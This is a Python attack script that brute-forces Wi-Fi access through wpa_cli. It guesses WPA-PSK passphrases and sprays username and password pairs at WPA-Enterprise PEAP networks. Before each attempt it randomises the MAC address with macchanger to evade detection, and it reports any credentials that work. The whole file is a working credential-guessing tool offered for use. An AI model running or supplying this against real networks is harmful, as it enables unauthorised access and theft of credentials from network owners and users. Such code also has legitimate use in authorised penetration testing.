#!/usr/bin/env python

import pexpect
import argparse
import subprocess
from time import sleep

#set up arguments
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', metavar='interface', help='The wireless interface to use', required=True)
parser.add_argument('-s', '--ssid', metavar='ssid', help='The SSID to attack', required=True)
parser.add_argument('-u', '--user-file', help='File with usernames to attack', metavar='user-file', dest='user_file')
parser.add_argument('-p', '--pass-file', help='File with passwords to try', metavar='pass-file', dest='pass_file',
                    required=True)
args = parser.parse_args()

interface = args.interface
ssid = args.ssid
if args.user_file:
    user_file = open(args.user_file, 'r')
    usernames = user_file.readlines()
    user_file.close()
pass_file = open(args.pass_file, 'r')
passwords = pass_file.readlines()
pass_file.close()

#start up the wpa_supplicant cli
wpa_cli = pexpect.spawn('wpa_cli')
wpa_cli.expect('\n>')

#set the interface we asked for
wpa_cli.sendline('interface {0}'.format(interface))
wpa_cli.expect('wlan0')

#add and configure network to attack
wpa_cli.sendline('add_network')
wpa_cli.expect('\r\n([0-9]+)')
network_id = wpa_cli.match.group(1)
wpa_cli.sendline('set_network {0} ssid "{1}"'.format(network_id, ssid))
wpa_cli.expect('OK')

def cleanup():
    #clean up so we're not spraying login attempts everywhere
    wpa_cli.sendline('remove_network {0}'.format(network_id))
    exit()

try:
    #do WPA PSK attack
    if not args.user_file:
        for password in passwords:
            #shuffle MAC address around
            subprocess.call('ifconfig {0} down'.format(args.interface), shell=True)
            sleep(0.25)
            subprocess.call('macchanger -A {0} > /dev/null'.format(interface), shell=True)
            sleep(0.25)
            subprocess.call('ifconfig {0} up'.format(args.interface), shell=True)
            sleep(0.50)
            subprocess.call('iwconfig {0} essid "{1}"'.format(interface, ssid), shell=True)

            wpa_cli.sendline('set_network {0} psk "{1}"'.format(network_id, password.rstrip('\n')))
            wpa_cli.expect('OK')
            wpa_cli.sendline('select_network {0}'.format(network_id))
            try:
                wpa_cli.expect('Trying to associate with ..:..:..:..:..:.. \(SSID=\'(.*)\' freq=[0-9]* MHz\)',
                               timeout=30)
            except KeyboardInterrupt:
                    cleanup()
            except:
                continue

            #if the right network wasn't reached, we might be falling back to a previous network
            if wpa_cli.match.group(1) != ssid:
                print 'Could not connect to {0}... trying again'.format(ssid)
                continue

            #check results
            result = wpa_cli.expect(['WPA: 4-Way Handshake failed - pre-shared key may be incorrect',
                                    'WPA: Key negotiation completed with ..:..:..:..:..:..'], timeout=120)

            #successful guess
            if result == 1:
                exit('Successful connection\nSSID: {0}\nPassphrase: {1}'.format(ssid, password.rstrip('\n')))

    #do WPA Enterprise attack
    if args.user_file:
        wpa_cli.sendline('set_network {0} key_mgmt WPA-EAP'.format(network_id))
        wpa_cli.sendline('set_network {0} eap PEAP'.format(network_id))
        for username in usernames:
            wpa_cli.sendline('set_network {0} identity "{1}"'.format(network_id, username.rstrip('\n')))
            for password in passwords:
                #shuffle MAC address around
                subprocess.call('ifconfig {0} down'.format(interface), shell=True)
                sleep(0.25)
                subprocess.call('macchanger -A {0} > /dev/null'.format(interface), shell=True)
                sleep(0.25)
                subprocess.call('ifconfig {0} up'.format(interface), shell=True)
                sleep(0.50)
                subprocess.call('iwconfig {0} essid "{1}"'.format(interface, ssid), shell=True)

                wpa_cli.sendline('set_network {0} password "{1}"'.format(network_id, password.rstrip('\n')))
                wpa_cli.sendline('select_network {0}'.format(network_id))
                try:
                    wpa_cli.expect('Trying to associate with ..:..:..:..:..:.. \(SSID=\'(.*)\' freq=[0-9]* MHz\)',
                                   timeout=30)
                except KeyboardInterrupt:
                    cleanup()
                except:
                    continue

                #if the right network wasn't reached, we might be falling back to a previous network
                if wpa_cli.match.group(1) != ssid:
                    print 'Could not connect to {0}... trying again'.format(ssid)
                    continue

                #check results
                result = wpa_cli.expect(['CTRL-EVENT-EAP-FAILURE EAP authentication failed',
                               'CTRL-EVENT-DISCONNECTED bssid=..:..:..:..:..:.. reason=3',
                               'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully'], timeout=120)

                #successful guess
                if result == 2:
                    print '\'{0}\' : \'{1}\''.format(username.rstrip('\n'), password.rstrip('\n'))

except Exception as e:
    #clean up so we're not spraying login attempts everywhere
    wpa_cli.sendline('remove_network {0}'.format(network_id))
    exit(e)


cleanup()
